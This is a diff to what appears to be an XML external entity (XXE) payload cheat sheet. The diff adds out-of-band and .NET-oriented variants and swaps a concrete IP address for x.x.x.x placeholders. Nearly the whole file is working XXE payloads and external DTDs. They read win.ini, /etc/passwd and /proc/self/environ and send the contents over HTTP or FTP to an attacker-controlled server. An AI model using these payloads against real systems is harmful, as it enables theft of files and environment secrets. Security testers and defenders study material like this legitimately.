@@ -1,3 +1,7 @@
+--------------------------------------------------------------
+Vanilla, used to verify outbound xxe or blind xxe
+--------------------------------------------------------------
+
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -16,11 +20,29 @@ OoB extraction
 %sp;
 %param1;
 ]>
+<r>&exfil;</r>
 
 ## External dtd: ##
 
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+----------------------------------------------------------------
+OoB variation of above (seems to work better against .NET)
+----------------------------------------------------------------
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+%exfil;
+]>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
 
 -----------------------------------------------------------------------
 OoB extra nice
@@ -57,23 +79,25 @@ File-not-found exception based extraction
 <!ENTITY % three SYSTEM "file:///etc/passwd">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
 
+-------------------------^ you might need to encode this % (depends on your target) as: &#x25;
+
 --------------
 FTP
 --------------
 <?xml version="1.0" ?>
 <!DOCTYPE a [ 
-<!ENTITY % asd SYSTEM "http://46.101.180.57:4444/ext.dtd">
-       %asd;
-       %c;
+<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
+%asd;
+%c;
 ]>
 <a>&rrr;</a>
 
 
 ## External dtd ##
 <!ENTITY % d SYSTEM "file:///proc/self/environ">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://46.101.180.57:2121/%d;'>">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
 
 ---------------------------
 Inside SOAP body
 ---------------------------
-<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
